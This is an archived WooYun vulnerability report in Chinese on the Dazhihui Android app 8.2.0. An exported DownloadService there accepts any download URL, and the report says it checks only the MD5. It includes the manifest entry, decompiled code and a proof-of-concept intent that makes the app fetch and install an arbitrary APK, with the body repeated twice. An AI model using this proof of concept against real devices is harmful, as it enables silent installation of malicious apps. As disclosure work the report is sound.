{"id": 82673, "wybug_id": "wooyun-2015-0150312", "wybug_title": "大智慧安卓app越权下载任意应用", "wybug_corp": "上海大智慧", "wybug_author": "路人甲", "wybug_date": "2015-11-20 10:57", "wybug_open_date": "2016-02-23 11:00", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "手机应用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-25：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-23：\t细节向公众公开  简要描述： 大智慧安卓app最新版本 8.2.0越权下载任意应用 详细说明：  大智慧安卓app可越权下载任意应用大智慧Android 8.2.0客户端组件**.**.**.**work.DownloadService 暴露，导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！版本号\n\nManifest.xml文件中，**.**.**.**work.DownloadService组件对外暴露\n<service android:exported=\"true\" android:name=\"**.**.**.**work.DownloadService\" android:process=\"**.**.**.**work.DownloadService\">            <intent-filter android:priority=\"1000\">                <action android:name=\"**.**.**.**work.DownloadService\"/>            </intent-filter>        </service>\n该组件对应的代码执行部分如下：\npublic static boolean a(Context paramContext, String paramString, boolean paramBoolean1, boolean paramBoolean2)  {    Intent localIntent;    String str1;    int i1;    if ((paramContext != null) && (!TextUtils.isEmpty(paramString)))    {      localIntent = new Intent(paramContext, DownloadService.class);      localIntent.putExtra(\"cmd\", \"start_download\");      str1 = null;      i1 = paramString.indexOf(\"?MD5=\");      if (i1 == -1) {        break label254;      }      str1 = paramString.substring(i1 + 5);    }    label254:    for (String str2 = paramString.substring(0, i1);; str2 = paramString)    {      if ((!TextUtils.isEmpty(str2)) && (!TextUtils.isEmpty(str1)))      {        Log.i(\"GUH\", \"startDownloadService\");        localIntent.putExtra(\"download_silent\", paramBoolean1);        localIntent.putExtra(\"download_url\", str2);        localIntent.putExtra(\"download_MD5\", str1);        localIntent.putExtra(\"download_only_wifi\", paramBoolean2);        a = str2;        b = str1;        com.android.dazhihui.b.a.b.a().b(\"apkDownloadUrl\", a);        com.android.dazhihui.b.a.b.a().b(\"apkDownloadMd5\", b);        com.android.dazhihui.b.a.b.a().f();        paramContext.startService(localIntent);      }      for (boolean bool = true;; bool = false)      {        Log.i(\"GUH\", \"startDownloadService return=\" + bool + \" updateUrl=\" + paramString + \" silent=\" + paramBoolean1 + \" wifiLimit=\" + paramBoolean2);        return bool;      }    }  }\n该组件从Intent从获取cmd的命令，以及download_silent，download_url，download_MD5，download_only_wifi等数据，当cmd为start_download时，执行下载app升级操作。并且升级时，的url可以从download_url指定，下载时只是验证md5是否正确，并未验证url的合法性，所以第三方app可以任意指定下载地址。改漏洞触发poc关键代码如下 public void dazhihui_poc()    {    \tIntent intent = new Intent();\t\tComponentName com = new ComponentName(\"com.android.dazhihui\", \"**.**.**.**work.DownloadService\");\t\tintent.setComponent( com ); \t\tintent.putExtra(\"cmd\", \"start_download\" );\t\t//intent.putExtra(\"download_MD5\", \"840f65125e7a995f27871fa5ccdb449b\" );\t\tintent.putExtra(\"download_MD5\", \"e2f3db1c41839d1d510870f42cf0aaa7\" );\t\t\t\tintent.putExtra(\"download_silent\", false );\t\tintent.putExtra(\"download_only_wifi\", false );\t\t//intent.putExtra(\"download_url\", \"**.**.**.**/app/xrt-v1.0.apk\" );\t\tintent.putExtra(\"download_url\", \"http://**.**.**.**/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk\" );\t \t\t//intent.setAction(\"com.baidu.android.pushservice.action.MESSAGE\");  \t\tstartService( intent );    }   漏洞证明：  大智慧安卓app可越权下载任意应用大智慧Android 8.2.0客户端组件**.**.**.**work.DownloadService 暴露，导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！Manifest.xml文件中，**.**.**.**work.DownloadService组件对外暴露\n<service android:exported=\"true\" android:name=\"**.**.**.**work.DownloadService\" android:process=\"**.**.**.**work.DownloadService\">            <intent-filter android:priority=\"1000\">                <action android:name=\"**.**.**.**work.DownloadService\"/>            </intent-filter>        </service>\n该组件对应的代码执行部分如下：\npublic static boolean a(Context paramContext, String paramString, boolean paramBoolean1, boolean paramBoolean2)  {    Intent localIntent;    String str1;    int i1;    if ((paramContext != null) && (!TextUtils.isEmpty(paramString)))    {      localIntent = new Intent(paramContext, DownloadService.class);      localIntent.putExtra(\"cmd\", \"start_download\");      str1 = null;      i1 = paramString.indexOf(\"?MD5=\");      if (i1 == -1) {        break label254;      }      str1 = paramString.substring(i1 + 5);    }    label254:    for (String str2 = paramString.substring(0, i1);; str2 = paramString)    {      if ((!TextUtils.isEmpty(str2)) && (!TextUtils.isEmpty(str1)))      {        Log.i(\"GUH\", \"startDownloadService\");        localIntent.putExtra(\"download_silent\", paramBoolean1);        localIntent.putExtra(\"download_url\", str2);        localIntent.putExtra(\"download_MD5\", str1);        localIntent.putExtra(\"download_only_wifi\", paramBoolean2);        a = str2;        b = str1;        com.android.dazhihui.b.a.b.a().b(\"apkDownloadUrl\", a);        com.android.dazhihui.b.a.b.a().b(\"apkDownloadMd5\", b);        com.android.dazhihui.b.a.b.a().f();        paramContext.startService(localIntent);      }      for (boolean bool = true;; bool = false)      {        Log.i(\"GUH\", \"startDownloadService return=\" + bool + \" updateUrl=\" + paramString + \" silent=\" + paramBoolean1 + \" wifiLimit=\" + paramBoolean2);        return bool;      }    }  }\n该组件从Intent从获取cmd的命令，以及download_silent，download_url，download_MD5，download_only_wifi等数据，当cmd为start_download时，执行下载app升级操作。并且升级时，的url可以从download_url指定，下载时只是验证md5是否正确，并未验证url的合法性，所以第三方app可以任意指定下载地址。改漏洞触发poc关键代码如下 public void dazhihui_poc()    {    \tIntent intent = new Intent();\t\tComponentName com = new ComponentName(\"com.android.dazhihui\", \"**.**.**.**work.DownloadService\");\t\tintent.setComponent( com ); \t\tintent.putExtra(\"cmd\", \"start_download\" );\t\t//intent.putExtra(\"download_MD5\", \"840f65125e7a995f27871fa5ccdb449b\" );\t\tintent.putExtra(\"download_MD5\", \"e2f3db1c41839d1d510870f42cf0aaa7\" );\t\t\t\tintent.putExtra(\"download_silent\", false );\t\tintent.putExtra(\"download_only_wifi\", false );\t\t//intent.putExtra(\"download_url\", \"**.**.**.**/app/xrt-v1.0.apk\" );\t\tintent.putExtra(\"download_url\", \"http://**.**.**.**/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk\" );\t \t\t//intent.setAction(\"com.baidu.android.pushservice.action.MESSAGE\");  \t\tstartService( intent );    }下载app\n\n升级界面\n\napp升级日志如下\n\n安装界面\n\n   修复方案：  1 组件不暴露2 对升级地址进行判断   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-23 11:00 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}